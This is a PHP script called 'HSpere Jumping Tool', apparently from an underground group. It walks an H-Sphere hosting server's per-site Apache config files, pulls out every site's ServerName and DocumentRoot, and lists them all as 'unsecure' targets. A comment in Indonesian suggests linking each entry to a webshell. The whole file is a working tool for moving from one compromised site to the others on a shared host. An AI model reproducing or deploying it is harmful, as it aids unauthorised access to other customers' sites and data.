<?php
error_reporting(E_ALL);
ini_set("display_errors", 0);
$title = "HSpere Jumping Tool" ;

$dir = "<table border='1' style='border-collapse: collapse'>
        <tr>
        	<td>ServerName</td>
        	<td>DocumentRoot</td>
        	<td>Vulnerable</td>
        </tr>
        ";
$chsphere = "/hsphere/local/config/httpd/sites/";
$opendir = opendir($chsphere); 
while (($file = readdir($opendir)) !== false) {
$path = $chsphere.$file;

$readfile = fopen($path,"r");
$content = fread($readfile,filesize($path));
fclose($readfile);

$DocumentRoot = explode('DocumentRoot', $content );
$DRoot = explode('ServerName', $DocumentRoot[1] );

$ServerName = explode('ServerName', $content );
$SName = explode('ServerAlias', $ServerName[1] );

$dir .= "<tr><td>".$SName[0]."</td><td>".$DRoot[0]."</td><td>unsecure</td></tr>"; //disini kamu bisa bikin link ke webshellnya. 
}
closedir($opendir);
$dir .= "</table>";

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
	<meta name="author" content="RaideRz" />
    <title><?php echo $title ?> - ExploreCrew UnderGround</title>
        <style type="text/css">
            *{ color: #444;}
        	body { background: #111;  }
            #xcrew { width:800px auto ; background: #000; min-height: 200px; border: 1px outset #454545; margin: 50px; padding: 5px; }
            #output {color: #333 ;} 
       </style>     
</head>
<body>
<div id="xcrew">
<p style="font-size: 24px; text-align: center; color: red;"><strong>..:: <?php echo $title ?> - ExploreCrew UnderGround Coder ::..</strong></p><br/>
<div id="output">
<?php echo $dir ?>
</div>
</div>
</body>
</html>
